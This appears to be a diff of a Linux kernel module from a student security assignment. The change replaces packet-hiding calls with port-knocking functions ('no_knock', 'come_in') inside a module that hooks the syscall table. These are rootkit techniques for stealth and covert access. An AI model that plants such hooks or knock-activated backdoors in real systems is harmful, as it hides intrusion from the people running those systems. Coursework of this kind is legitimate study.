@@ -3,7 +3,7 @@
 #include <linux/init.h> /* Needed for the macros, hints for linking and loading, see http://tldp.org/LDP/lkmpg/2.6/html/x245.html */
 
 #include "hooking.h"
-#include "packet_hiding.h"
+#include "port_knocking.h"
 
 #define DRIVER_AUTHOR "Nicolas Appel, Wenwen Chen"
 #define DRIVER_DESC   "Assigment 10 - Packet Hiding"
@@ -16,7 +16,7 @@ static int __init mod_init(void)
 	printk(KERN_INFO "syscall table:%016lx\n",(long unsigned int) sct);
 	else return 0;
 
-	hide_packets();
+	no_knock();
 
 	return 0;
 }
@@ -24,7 +24,7 @@ static int __init mod_init(void)
 static void __exit mod_exit(void)
 {
 	if(sct == NULL) return;
-	unhide_packets();
+	come_in();
 }
 
 
